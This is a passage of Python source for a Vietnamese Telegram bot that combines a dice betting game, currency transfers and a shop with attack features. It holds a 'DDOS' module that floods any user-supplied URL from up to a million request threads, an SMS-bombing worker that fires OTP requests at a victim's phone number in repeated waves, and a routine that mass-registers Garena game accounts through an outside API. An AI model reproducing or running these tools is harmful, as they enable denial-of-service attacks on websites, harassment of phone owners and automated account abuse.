    if rt.get("monitoring"): await update.callback_query.edit_message_text("⚠️ Đang canh rồi."); return
    if not data["accounts"]: await update.callback_query.answer("Chưa có tài khoản!", show_alert=True); return
    if not data["codes"]: await update.callback_query.answer("Chưa có code!", show_alert=True); return
    rt["monitor_task"] = asyncio.create_task(xworld_monitor_loop(uid, update.effective_chat.id, context))
    await update.callback_query.edit_message_text(f"✅ Bắt đầu canh! Ngưỡng: {data['threshold']}", parse_mode='Markdown', reply_markup=xworld_menu_keyboard())

async def stop_xworld_monitor(update, context):
    rt = get_user_runtime(update.effective_user.id)
    if rt.get("monitoring"): rt["monitoring"] = False; rt.get("monitor_task").cancel(); await update.callback_query.edit_message_text("⏹️ Đã dừng.", reply_markup=xworld_menu_keyboard())
    else: await update.callback_query.answer("Không có phiên canh nào.")

# ==================== GAME HANDLERS ====================
async def game_setbet_prompt(update, context):
    await update.callback_query.edit_message_text("Chọn cách cược:", reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("💵 Nhập số tiền", callback_data="game_input_bet")],
        [InlineKeyboardButton("🔥 All in", callback_data="game_allin")]
    ]))

async def game_currency_toggle(update, context):
    uid = update.effective_user.id; g = get_user_game_data(uid)
    g["bet_currency"] = "IZE" if g.get("bet_currency","VND") == "VND" else "VND"
    save_all_data()
    mk, tx = game_menu_keyboard(uid)
    await update.callback_query.edit_message_text(tx, parse_mode='Markdown', reply_markup=mk)

async def game_input_bet(update, context):
    context.user_data["expect_game_bet"] = True
    await update.callback_query.edit_message_text("Nhập số tiền cược (VD: 50,000 hoặc 50000):")

async def game_allin(update, context):
    uid = update.effective_user.id; g = get_user_game_data(uid)
    cur = g.get("bet_currency", "VND")
    bal = g["balance"] if cur == "VND" else g["ize_balance"]
    if bal <= 0: await update.callback_query.edit_message_text("❌ Hết tiền."); return
    g["bet_amount"] = bal; save_all_data()
    mk, _ = game_menu_keyboard(uid)
    await update.callback_query.edit_message_text(f"✅ All in: {format_money(bal) if cur=='VND' else format_ize(bal)}", reply_markup=mk)

async def process_game_bet_amount(update, context):
    uid = update.effective_user.id; g = get_user_game_data(uid)
    cur = g.get("bet_currency", "VND")
    try: amount = int(update.message.text.strip()) if cur == "IZE" else parse_money(update.message.text.strip())
    except: await update.message.reply_text("❌ Số không hợp lệ."); return
    if amount <= 0: await update.message.reply_text("❌ >0."); return
    bal = g["balance"] if cur == "VND" else g["ize_balance"]
    if amount > bal: await update.message.reply_text(f"❌ Chỉ có {format_money(bal) if cur=='VND' else format_ize(bal)}"); return
    g["bet_amount"] = amount; save_all_data()
    context.user_data.pop("expect_game_bet", None)
    mk, _ = game_menu_keyboard(uid)
    await update.message.reply_text(f"✅ Đặt cược: {format_money(amount) if cur=='VND' else format_ize(amount)}", reply_markup=mk)

async def play_tai_xiu(update, context, choice):
    uid = update.effective_user.id; g = get_user_game_data(uid)
    if g["bet_amount"] <= 0: await update.callback_query.edit_message_text("❌ Chưa đặt cược."); return
    cur = g.get("bet_currency", "VND"); bet = g["bet_amount"]
    result = random.randint(1,6)+random.randint(1,6)+random.randint(1,6); is_tai = result >= 11
    win = (choice == "tai" and is_tai) or (choice == "xiu" and not is_tai)
    if cur == "IZE":
        if win: g["ize_balance"] += bet; msg = f"🎉 Tài ({result}). +{format_ize(bet)}\nIZE: {format_ize(g['ize_balance'])}"
        else: g["ize_balance"] -= bet; msg = f"😞 Xỉu ({result}). -{format_ize(bet)}\nIZE: {format_ize(g['ize_balance'])}"
    else:
        if win: g["balance"] += bet; msg = f"🎉 Tài ({result}). +{format_money(bet)}\nVND: {format_money(g['balance'])}"
        else: g["balance"] -= bet; msg = f"😞 Xỉu ({result}). -{format_money(bet)}\nVND: {format_money(g['balance'])}"
    g["bet_amount"] = 0; save_all_data()
    mk, _ = game_menu_keyboard(uid)
    await update.callback_query.edit_message_text(msg, reply_markup=mk)

# ==================== DDOS ====================
def is_valid_url(url): return urlparse(url).scheme in ['http','https'] and urlparse(url).netloc

def ddos_worker(url, stop_event, stats_queue):
    while not stop_event.is_set():
        try: r = requests.get(url, timeout=5); stats_queue.put(('ok',r.status_code))
        except requests.exceptions.Timeout: stats_queue.put(('timeout',None))
        except requests.exceptions.ConnectionError: stats_queue.put(('conn_err',None))
        except Exception as e: stats_queue.put(('error',str(e)))

async def run_stress_test(update, context, chat_id, url, threads, duration):
    ev = threading.Event(); stress_tasks[chat_id] = ev; q = Queue()
    workers = [threading.Thread(target=ddos_worker, args=(url, ev, q)) for _ in range(threads)]
    for t in workers: t.daemon = True; t.start()
    await context.bot.send_message(chat_id, f"🚀 Test {url} với {threads} luồng trong {duration}s")
    s_ok = s_timeout = s_err = 0; start = time.time()
    while time.time() - start < duration:
        while not q.empty():
            m = q.get_nowait()
            if m[0]=='ok': s_ok+=1
            elif m[0]=='timeout': s_timeout+=1
            else: s_err+=1
        await asyncio.sleep(0.5)
    ev.set(); [t.join() for t in workers]
    await context.bot.send_message(chat_id, f"✅ Xong! OK: {s_ok}, Timeout: {s_timeout}, Lỗi: {s_err}")
    stress_tasks.pop(chat_id, None)

async def ddos_input_url(update, context):
    context.user_data['expect_ddos'] = 'url'
    await update.callback_query.edit_message_text("Nhập URL cần test (http:// hoặc https://):")

async def ddos_input_threads(update, context, url):
    context.user_data['ddos_url'] = url; context.user_data['expect_ddos'] = 'threads'
    await update.message.reply_text("Nhập số luồng (1-1000000):")

async def ddos_input_duration(update, context, threads):
    context.user_data['ddos_threads'] = threads; context.user_data['expect_ddos'] = 'duration'
    await update.message.reply_text("Nhập thời gian (giây, 1-60):")

def ddos_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Nhập web & bắt đầu", callback_data="ddos_start")],
        [InlineKeyboardButton("🛑 Dừng test", callback_data="ddos_stop")]
    ])

# ==================== SCAN LQ ====================
def create_garena_account(session):
    for attempt in range(3):
        try:
            r = session.get("https://keyherlyswar.x10.mx/Apidocs/reg/reglq.php", timeout=30)
            if r.status_code != 200:
                if attempt < 2: continue
                return False, None, None, f"HTTP {r.status_code}"
            data = r.json()
            if not data.get("status") or not data.get("result"):
                if attempt < 2: continue
                return False, None, None, "API không hợp lệ"
            info = data["result"][0]
            username = info.get("account") or info.get("username", "")
            password = info.get("password", "")
            if not username or not password:
                if attempt < 2: continue
                return False, None, None, "Thiếu user/pass"
            return True, username, password, "OK"
        except: pass
    return False, None, None, "Max retries"

async def scan_lq_worker(chat_id, quantity, context):
    ev = threading.Event(); scan_lq_tasks[chat_id] = ev
    s = requests.Session(); s.headers.update({"User-Agent":"Mozilla/5.0"})
    created = 0
    for i in range(1, quantity+1):
        if ev.is_set(): break
        ok, user, pwd, msg = create_garena_account(s)
        if ok: created += 1; await context.bot.send_message(chat_id, f"✅ #{i}: {user} : {pwd}")
        else: await context.bot.send_message(chat_id, f"❌ #{i}: {msg}")
        await asyncio.sleep(0.5)
    await context.bot.send_message(chat_id, f"🏁 {created}/{quantity}")
    scan_lq_tasks.pop(chat_id, None)

async def scan_lq_infinite(chat_id, context):
    ev = threading.Event(); scan_lq_tasks[chat_id] = ev
    s = requests.Session(); s.headers.update({"User-Agent":"Mozilla/5.0"})
    cnt = 0
    await context.bot.send_message(chat_id, "♾️ Scan liên tục. Dừng bằng nút.")
    while not ev.is_set():
        ok, user, pwd, _ = create_garena_account(s)
        if ok: cnt += 1; await context.bot.send_message(chat_id, f"✅ #{cnt}: {user} : {pwd}")
        else: await context.bot.send_message(chat_id, f"❌ Lần {cnt+1}")
        await asyncio.sleep(0.5)
    await context.bot.send_message(chat_id, "⏹️ Đã dừng")
    scan_lq_tasks.pop(chat_id, None)

def scan_lq_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔢 Scan số lượng", callback_data="scanlq_quantity")],
        [InlineKeyboardButton("♾️ Scan liên tục", callback_data="scanlq_infinite")],
        [InlineKeyboardButton("🛑 Dừng scan", callback_data="scanlq_stop")]
    ])

# ==================== SPAM SMS ====================
async def spam_worker(chat_id, phone, count, context):
    ev = threading.Event(); spam_tasks[chat_id] = ev
    for i in range(1, count+1):
        if ev.is_set(): break
        await context.bot.send_message(chat_id, f"🔄 Đợt {i}/{count}...")
        loop = asyncio.get_running_loop()
        def run():
            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as pool:
                list(pool.map(lambda f: f(phone), all_otp_funcs))
        await loop.run_in_executor(None, run)
        await asyncio.sleep(4)
    if not ev.is_set(): await context.bot.send_message(chat_id, "✅ Hoàn thành!")
    spam_tasks.pop(chat_id, None)

def spam_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📱 Nhập SĐT & số lần", callback_data="spam_input")],
        [InlineKeyboardButton("🛑 Dừng spam", callback_data="spam_stop")]
    ])

# ==================== CHAT HELPERS ====================
def chat_display_name(uid):
    if uid in chat_state["anon_users"]: return "Ẩn danh"
    info = user_data_store.get(str(uid), {}).get("profile", {})
    if info.get("username"): return f"@{info['username']}"
    name = (info.get("first_name","") + " " + info.get("last_name","")).strip()
    return name if name else f"ID:{uid}"

async def chat_relay(context, sender_id, text):
    for uid in chat_state["users"]:
        if uid == sender_id: continue
        try:
            msg = await context.bot.send_message(uid, text)
            chat_state["messages"].setdefault(str(sender_id), []).append({"chat_id": uid, "message_id": msg.message_id})
        except: pass

async def chat_broadcast_msg(context, text):
    for uid in chat_state["users"]:
        try: await context.bot.send_message(uid, text)
        except: pass

# ==================== IZE ====================
async def cmd_convert(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    if not context.args: await update.message.reply_text("Dùng: /convert <số VND> (tối thiểu 1,000)"); return
    try: amount = parse_money(context.args[0])
    except: await update.message.reply_text("Số không hợp lệ."); return
    if amount < 1_000: await update.message.reply_text("Tối thiểu 1,000 VND."); return
    game = get_user_game_data(uid)
    if game["balance"] < amount: await update.message.reply_text(f"❌ Không đủ VND. Số dư: {format_money(game['balance'])}"); return
    ize_earned = amount // 1_000; remain = amount % 1_000
    game["balance"] -= amount; game["ize_balance"] += ize_earned; game["balance"] += remain
    save_all_data()
    await update.message.reply_text(f"✅ Đã đổi {format_money(amount)} → {format_ize(ize_earned)}\n💵 VND: {format_money(game['balance'])}\n💠 IZE: {format_ize(game['ize_balance'])}")

async def cmd_convertize(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    if not context.args: await update.message.reply_text("Dùng: /convertize <số IZE>"); return
    try: ize_amount = int(context.args[0])
    except: await update.message.reply_text("Số IZE không hợp lệ."); return
    if ize_amount <= 0: await update.message.reply_text(">0."); return
    game = get_user_game_data(uid)
    if game["ize_balance"] < ize_amount: await update.message.reply_text(f"❌ Không đủ IZE. Số dư: {format_ize(game['ize_balance'])}"); return
    vnd_earned = ize_amount * 1_000
    game["ize_balance"] -= ize_amount; game["balance"] += vnd_earned
    save_all_data()
    await update.message.reply_text(f"✅ Đã đổi {format_ize(ize_amount)} → {format_money(vnd_earned)}\n💵 VND: {format_money(game['balance'])}\n💠 IZE: {format_ize(game['ize_balance'])}")

async def cmd_ize(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    game = get_user_game_data(uid)
    await update.message.reply_text(f"💠 Số dư IZE của bạn: {format_ize(game['ize_balance'])}")

# ==================== GIFTIZE, RMBANK, RMVND (CHỈ OWNER) ====================
async def cmd_giftize(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Chỉ chủ bot mới có quyền này."); return
    if len(context.args) < 2: await update.message.reply_text("/giftize <id/@username> <số IZE>"); return
    target = context.args[0]
    try: amount = int(context.args[1])
    except: await update.message.reply_text("Số IZE không hợp lệ."); return
    if amount <= 0: await update.message.reply_text(">0."); return
    receiver_id = None
    if target.startswith("@"):
        uname = target[1:].lower()
        for k, v in user_data_store.items():
            if k in ("blacklist","owner","bot_enabled","keys","top_reset_date","shop_items"): continue
            if v.get("profile",{}).get("username","").lower() == uname: receiver_id = int(k); break
    else:
        try: receiver_id = int(target)
        except: pass
    if not receiver_id: await update.message.reply_text("❌ Không tìm thấy người nhận."); return
    recv = get_user_game_data(receiver_id)
    recv["ize_balance"] += amount
    save_all_data()
    try: await context.bot.send_message(receiver_id, f"🎁 Chủ bot tặng {format_ize(amount)}. Số dư IZE: {format_ize(recv['ize_balance'])}")
    except: pass
    await update.message.reply_text(f"✅ Đã tặng {format_ize(amount)} IZE cho {target}.")

async def cmd_rmbank(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Chỉ chủ bot mới có quyền này."); return
    if not context.args: await update.message.reply_text("/rmbank <id/@username> <số IZE>"); return
    target = context.args[0]
    try: amount = int(context.args[1])
    except: await update.message.reply_text("Số IZE không hợp lệ."); return
    if amount <= 0: await update.message.reply_text(">0."); return
    receiver_id = None
    if target.startswith("@"):
        uname = target[1:].lower()
        for k, v in user_data_store.items():
            if k in ("blacklist","owner","bot_enabled","keys","top_reset_date","shop_items"): continue
            if v.get("profile",{}).get("username","").lower() == uname: receiver_id = int(k); break
    else:
        try: receiver_id = int(target)
        except: pass
    if not receiver_id: await update.message.reply_text("❌ Không tìm thấy người dùng."); return
    game = get_user_game_data(receiver_id)
    if game["ize_balance"] < amount: await update.message.reply_text(f"❌ Người này chỉ có {format_ize(game['ize_balance'])}"); return
    game["ize_balance"] -= amount; save_all_data()
    try: await context.bot.send_message(receiver_id, f"⚠️ Chủ bot đã trừ {format_ize(amount)} IZE. Số dư IZE: {format_ize(game['ize_balance'])}")
    except: pass
    await update.message.reply_text(f"✅ Đã trừ {format_ize(amount)} IZE của {target}.")

async def cmd_rmvnd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Chỉ chủ bot mới có quyền này."); return
    if not context.args: await update.message.reply_text("/rmvnd <id/@username> <số VND>"); return
    target = context.args[0]
    try: amount = parse_money(context.args[1])
    except: await update.message.reply_text("Số VND không hợp lệ."); return
    if amount <= 0: await update.message.reply_text(">0."); return
    receiver_id = None
    if target.startswith("@"):
        uname = target[1:].lower()
        for k, v in user_data_store.items():
            if k in ("blacklist","owner","bot_enabled","keys","top_reset_date","shop_items"): continue
            if v.get("profile",{}).get("username","").lower() == uname: receiver_id = int(k); break
    else:
        try: receiver_id = int(target)
        except: pass
    if not receiver_id: await update.message.reply_text("❌ Không tìm thấy người dùng."); return
    game = get_user_game_data(receiver_id)
    if game["balance"] < amount: await update.message.reply_text(f"❌ Người này chỉ có {format_money(game['balance'])}"); return
    game["balance"] -= amount; save_all_data()
    try: await context.bot.send_message(receiver_id, f"⚠️ Chủ bot đã trừ {format_money(amount)} VND. Số dư VND: {format_money(game['balance'])}")
    except: pass
    await update.message.reply_text(f"✅ Đã trừ {format_money(amount)} VND của {target}.")

# ==================== VND (HỖ TRỢ IZE) ====================
async def cmd_vnd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Không có quyền."); return
    if len(context.args) < 2: await update.message.reply_text("/vnd <id/@username> <số VND>   hoặc   /vnd ize <id/@username> <số IZE>"); return
    if context.args[0].lower() == "ize":
        if len(context.args) < 3: await update.message.reply_text("Thiếu số IZE."); return
        target = context.args[1]
        try: amount = int(context.args[2])
        except: await update.message.reply_text("Số IZE không hợp lệ."); return
        if amount <= 0: await update.message.reply_text(">0."); return
        receiver_id = None
        if target.startswith("@"):
            uname = target[1:].lower()
            for k, v in user_data_store.items():
                if k in ("blacklist","owner","bot_enabled","keys","top_reset_date","shop_items"): continue
                if v.get("profile",{}).get("username","").lower() == uname: receiver_id = int(k); break
        else:
            try: receiver_id = int(target)
            except: pass
        if not receiver_id: await update.message.reply_text("❌ Không tìm thấy người nhận."); return
        recv = get_user_game_data(receiver_id)
        recv["ize_balance"] += amount; save_all_data()
        try: await context.bot.send_message(receiver_id, f"🎁 Admin tặng {format_ize(amount)} IZE. Số dư IZE: {format_ize(recv['ize_balance'])}")
        except: pass
        await update.message.reply_text(f"✅ Đã tặng {format_ize(amount)} IZE cho {target}.")
    else:
        target = context.args[0]
        try: amount = parse_money(context.args[1])
        except: await update.message.reply_text("Số VND không hợp lệ."); return
        if amount <= 0: await update.message.reply_text(">0."); return
        receiver_id = None
        if target.startswith("@"):
            uname = target[1:].lower()
            for k, v in user_data_store.items():
                if k in ("blacklist","owner","bot_enabled","keys","top_reset_date","shop_items"): continue
                if v.get("profile",{}).get("username","").lower() == uname: receiver_id = int(k); break
        else:
            try: receiver_id = int(target)
            except: pass
        if not receiver_id: await update.message.reply_text("❌ Không tìm thấy người nhận."); return
        recv = get_user_game_data(receiver_id)
        recv["balance"] += amount; save_all_data()
        try: await context.bot.send_message(receiver_id, f"🎁 Admin tặng {format_money(amount)} VND. Số dư VND: {format_money(recv['balance'])}")
        except: pass
        await update.message.reply_text(f"✅ Đã tặng {format_money(amount)} VND cho {target}.")

# ==================== BANK (HỖ TRỢ IZE) ====================
async def cmd_bank(update, context):
    uid = update.effective_user.id
    if not check_antispam(uid)[0] or is_blacklisted(uid): return
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    if not is_bot_enabled() and not is_owner(uid): await update.message.reply_text("⚠️ Bot đang tạm dừng."); return
    if len(context.args) < 2: await update.message.reply_text("/bank <id/@username> <số VND>\n/bank ize <id/@username> <số IZE>"); return
    if context.args[0].lower() == "ize":
        if len(context.args) < 3: await update.message.reply_text("Thiếu số IZE."); return
        target = context.args[1]
        try: amount = int(context.args[2])
        except: await update.message.reply_text("Số IZE không hợp lệ."); return
        if amount <= 0: await update.message.reply_text(">0."); return
        sender = get_user_game_data(uid)
        if sender["ize_balance"] < amount: await update.message.reply_text(f"❌ Không đủ IZE. Số dư: {format_ize(sender['ize_balance'])}"); return
        receiver_id = None
        if target.startswith("@"):
            uname = target[1:].lower()
            for k, v in user_data_store.items():
                if k in ("blacklist","owner","bot_enabled","keys","top_reset_date","shop_items"): continue
                if v.get("profile",{}).get("username","").lower() == uname: receiver_id = int(k); break
        else:
            try: receiver_id = int(target)
            except: pass
        if not receiver_id: await update.message.reply_text("❌ Không tìm thấy người nhận."); return
        if receiver_id == uid: await update.message.reply_text("❌ Không thể tự chuyển."); return
        recv = get_user_game_data(receiver_id)
        sender["ize_balance"] -= amount; recv["ize_balance"] += amount; save_all_data()
        try: await context.bot.send_message(receiver_id, f"💰 Nhận {format_ize(amount)} IZE từ {uid}. Số dư IZE: {format_ize(recv['ize_balance'])}")
        except: pass
        await update.message.reply_text(f"✅ Đã chuyển {format_ize(amount)} IZE đến {target}.")
    else:
        target = context.args[0]
        try: amount = parse_money(context.args[1])
        except: await update.message.reply_text("Số VND không hợp lệ."); return
        if amount <= 0: await update.message.reply_text(">0."); return
        sender = get_user_game_data(uid)
        if sender["balance"] < amount: await update.message.reply_text(f"❌ Không đủ VND. Số dư: {format_money(sender['balance'])}"); return
        receiver_id = None
        if target.startswith("@"):
            uname = target[1:].lower()
            for k, v in user_data_store.items():
                if k in ("blacklist","owner","bot_enabled","keys","top_reset_date","shop_items"): continue
                if v.get("profile",{}).get("username","").lower() == uname: receiver_id = int(k); break
        else:
            try: receiver_id = int(target)
            except: pass
        if not receiver_id: await update.message.reply_text("❌ Không tìm thấy người nhận."); return
        if receiver_id == uid: await update.message.reply_text("❌ Không thể tự chuyển."); return
        recv = get_user_game_data(receiver_id)
        sender["balance"] -= amount; recv["balance"] += amount; save_all_data()
        try: await context.bot.send_message(receiver_id, f"💰 Nhận {format_money(amount)} VND từ {uid}. Số dư VND: {format_money(recv['balance'])}")
        except: pass
        await update.message.reply_text(f"✅ Đã chuyển {format_money(amount)} VND đến {target}.")

# ==================== SHOP (SẢN PHẨM THỰC, CHỌN TIỀN TỆ) ====================
def gen_item_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

async def cmd_shop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    kb = [
        [InlineKeyboardButton("🛒 Mua hàng", callback_data="shop_buy")],
        [InlineKeyboardButton("📋 Xem danh sách", callback_data="shop_list")],
    ]
    if is_admin(uid):
        kb.append([InlineKeyboardButton("📦 Đăng bán", callback_data="shop_sell")])
    await update.message.reply_text("🏪 *Cửa hàng*", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

async def shop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id; data = q.data

    if data == "shop_list":
        if not shop_items:
            await q.edit_message_text("📭 Chưa có sản phẩm."); return
        txt_lines = ["📋 *Sản phẩm:*"]
        for i, item in enumerate(shop_items, 1):
            cur = item.get("currency", "VND")
            price_str = format_money(item["price"]) if cur == "VND" else format_ize(item["price"])
            txt_lines.append(f"{i}. `{item['id']}` - {item['name']} | {price_str} | Còn: {item['stock']}")
        await q.edit_message_text("\n".join(txt_lines), parse_mode="Markdown"); return

    if data == "shop_sell":
        if not is_admin(uid): return
        context.user_data["shop_state"] = "sell_count"
        context.user_data["sell_items"] = []
        await q.edit_message_text("📦 Nhập số lượng sản phẩm muốn đăng:"); return

    if data == "shop_buy":
        context.user_data["shop_state"] = "buy_id"
        await q.edit_message_text("📝 Nhập ID sản phẩm:"); return

async def handle_shop_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id; txt = update.message.text.strip()
    state = context.user_data.get("shop_state")

    # --- ĐĂNG BÁN ---
    if state == "sell_count":
        try: count = int(txt); assert count > 0
        except: await update.message.reply_text("❌ Số không hợp lệ."); return
        context.user_data["sell_count"] = count; context.user_data["sell_index"] = 1
        context.user_data["shop_state"] = "sell_name"
        await update.message.reply_text(f"🔹 Sp 1/{count}\nNhập tên:"); return

    if state == "sell_name":
        context.user_data["sell_name"] = txt; context.user_data["shop_state"] = "sell_currency"
        await update.message.reply_text("💱 Chọn tiền tệ: VND hoặc IZE"); return

    if state == "sell_currency":
        cur = txt.upper()
        if cur not in ("VND", "IZE"): await update.message.reply_text("❌ Chỉ VND hoặc IZE."); return
        context.user_data["sell_currency"] = cur; context.user_data["shop_state"] = "sell_price"
        await update.message.reply_text(f"💰 Nhập giá ({cur}):"); return

    if state == "sell_price":
        try: price = parse_money(txt) if context.user_data.get("sell_currency") == "VND" else int(txt); assert price >= 0
        except: await update.message.reply_text("❌ Giá không hợp lệ."); return
        context.user_data["sell_price"] = price; context.user_data["shop_state"] = "sell_stock"
        await update.message.reply_text("📦 Nhập số lượng tồn:"); return

    if state == "sell_stock":
        try: stock = int(txt); assert stock > 0
        except: await update.message.reply_text("❌ Số lượng không hợp lệ."); return
        context.user_data["sell_stock"] = stock; context.user_data["shop_state"] = "sell_products"
        context.user_data["sell_products"] = []
        await update.message.reply_text(f"📝 Nhập sản phẩm 1/{stock} (nội dung thực tế, VD: key123):"); return

    if state == "sell_products":
        products = context.user_data.get("sell_products", [])
        products.append(txt)
        context.user_data["sell_products"] = products
        stock = context.user_data["sell_stock"]
        if len(products) < stock:
            await update.message.reply_text(f"📝 Nhập sản phẩm {len(products)+1}/{stock}:"); return
        # Hoàn tất đăng bán
        item = {
            "id": gen_item_id(), "name": context.user_data["sell_name"],
            "desc": "", "price": context.user_data["sell_price"],
            "currency": context.user_data.get("sell_currency", "VND"),
            "stock": stock, "products": products, "seller_id": uid
        }
        shop_items.append(item)
        user_data_store["shop_items"] = shop_items
        save_global_config()
        for k in ("shop_state","sell_count","sell_index","sell_name","sell_currency","sell_price","sell_stock","sell_products"):
            context.user_data.pop(k, None)
        await update.message.reply_text(f"✅ Đã đăng bán: {item['name']} (ID: `{item['id']}`)", parse_mode="Markdown"); return

    # --- MUA HÀNG ---
    if state == "buy_id":
        item_id = txt
        item = next((it for it in shop_items if it["id"] == item_id), None)
        if not item: await update.message.reply_text("❌ Không tìm thấy sản phẩm."); return
        context.user_data["buy_item"] = item; context.user_data["shop_state"] = "buy_qty"
        await update.message.reply_text(f"📦 Nhập số lượng muốn mua (còn {item['stock']}):"); return

    if state == "buy_qty":
        try:
            qty = int(txt)
            assert qty > 0
        except:
            await update.message.reply_text("❌ Số lượng không hợp lệ.")
            return

        item = context.user_data["buy_item"]
        if qty > item["stock"]:
            await update.message.reply_text("❌ Không đủ hàng.")
            return

        context.user_data["buy_qty"] = qty

        # Tự động lấy loại tiền của sản phẩm (VND hoặc IZE)
        cur = item.get("currency", "VND")
        total = item["price"] * qty
        game = get_user_game_data(uid)

        # Kiểm tra số dư đúng loại tiền
        if cur == "IZE":
            if game["ize_balance"] < total:
                await update.message.reply_text("❌ Không đủ IZE.")
                return
        else:
            if game["balance"] < total:
                await update.message.reply_text("❌ Không đủ VND.")
                return

        context.user_data["buy_currency"] = cur
        context.user_data["shop_state"] = "confirm"

        # Nút xác nhận mua
        kb = [
            [InlineKeyboardButton("✅ Xác nhận mua", callback_data="shop_confirm"),
             InlineKeyboardButton("❌ Hủy", callback_data="shop_cancel")]
        ]
        price_str = format_money(total) if cur == "VND" else format_ize(total)
        await update.message.reply_text(
            f"🛒 Xác nhận mua {qty}x {item['name']} ({price_str})?",
            reply_markup=InlineKeyboardMarkup(kb)
        )
        return

async def shop_confirm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id; data = q.data
    if data == "shop_confirm":
        qty = context.user_data.get("buy_qty", 1); item = context.user_data.get("buy_item")
        cur = context.user_data.get("buy_currency", "VND")
        if not item: return
        total = item['price'] * qty
        game = get_user_game_data(uid)
        if cur == "IZE":
            if game["ize_balance"] < total: await q.edit_message_text("❌ Không đủ IZE."); return
            game["ize_balance"] -= total
        else:
            if game["balance"] < total: await q.edit_message_text("❌ Không đủ VND."); return
            game["balance"] -= total
        # Trừ hàng và gửi sản phẩm
        products_sold = item["products"][:qty]
        del item["products"][:qty]
        item["stock"] -= qty
        if item["stock"] <= 0: shop_items.remove(item)
        user_data_store["shop_items"] = shop_items
        save_all_data()
        product_list = "\n".join(f"• `{p}`" for p in products_sold)
        await q.edit_message_text(f"✅ Đã mua {qty}x {item['name']}.\nSản phẩm:\n{product_list}\nLiên hệ @{ADMIN_USERNAME} nếu cần.")
        seller = item.get("seller_id")
        if seller and seller != uid:
            try: await context.bot.send_message(seller, f"📦 {qty}x {item['name']} đã được bán cho {uid}.")
            except: pass
        for k in ("shop_state","buy_item","buy_qty","buy_currency"): context.user_data.pop(k, None)
    elif data == "shop_cancel":
        await q.edit_message_text("❌ Đã hủy mua.")
        for k in ("shop_state","buy_item","buy_qty","buy_currency"): context.user_data.pop(k, None)
# ==================== CHAT HANDLERS (NÚT) ====================
async def cmd_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid) and not check_user_key(uid):
        await request_key(update, context)
        return
    chat_state["users"].add(uid)
    chat_state["active"] = True
    keyboard = [
        [InlineKeyboardButton("👻 Ẩn danh", callback_data="chat_anon"),
         InlineKeyboardButton("🚪 Thoát chat", callback_data="chat_leave")],
        [InlineKeyboardButton("🗑 Xóa tin của tôi", callback_data="chat_rm_self")],
        [InlineKeyboardButton("✉️ Nhắn riêng", callback_data="chat_ib")],
    ]
    if is_admin(uid):
        keyboard.append([InlineKeyboardButton("👮 Xóa tin người khác", callback_data="chat_rm_other")])
    await update.message.reply_text("💬 *Đã vào Chat Relay*\nMọi tin nhắn sẽ được gửi đi.", parse_mode="Markdown",
                                    reply_markup=InlineKeyboardMarkup(keyboard))
    await chat_broadcast_msg(context, f"📢 {chat_display_name(uid)} đã tham gia chat.")

async def chat_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id; data = q.data

    if data == "chat_anon":
        if uid in chat_state["anon_users"]:
            chat_state["anon_users"].discard(uid)
            await q.edit_message_text("✅ Bạn đã **hiện tên**.")
        else:
            chat_state["anon_users"].add(uid)
            await q.edit_message_text("👻 Bạn đã **ẩn danh**.")
        return

    if data == "chat_leave":
        chat_state["users"].discard(uid)
        await q.edit_message_text("🚪 Đã thoát chat.")
        await chat_broadcast_msg(context, f"👋 {chat_display_name(uid)} đã rời chat.")
        if not chat_state["users"]: chat_state["active"] = False
        return

    if data == "chat_rm_self":
        deleted = 0; key = str(uid)
        if key in chat_state["messages"]:
            for item in chat_state["messages"][key]:
                try: await context.bot.delete_message(item["chat_id"], item["message_id"]); deleted += 1
                except: pass
            del chat_state["messages"][key]
        await q.answer(f"Đã xóa {deleted} tin.", show_alert=True)
        return

    if data == "chat_rm_other":
        if not is_admin(uid): await q.answer("Chỉ admin.", show_alert=True); return
        context.user_data["expect_chat_rm"] = True
        await q.edit_message_text("✏️ ID/@username cần xóa:")
        return

    if data == "chat_ib":
        context.user_data["expect_chat_ib"] = True
        await q.edit_message_text("✏️ Nhập: `<id/@username> <nội dung>`")
        return

async def handle_chat_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id; txt = update.message.text.strip()

    if context.user_data.get("expect_chat_rm"):
        context.user_data.pop("expect_chat_rm")
        target = txt; target_id = None
        if target.startswith("@"):
            uname = target[1:].lower()
            for k, v in user_data_store.items():
                if k in ("blacklist","owner","bot_enabled","keys","top_reset_date","shop_items"): continue
                if v.get("profile",{}).get("username","").lower() == uname: target_id = int(k); break
        else:
            try: target_id = int(target)
            except: pass
        if not target_id: await update.message.reply_text("❌ Không tìm thấy."); return
        deleted = 0; key = str(target_id)
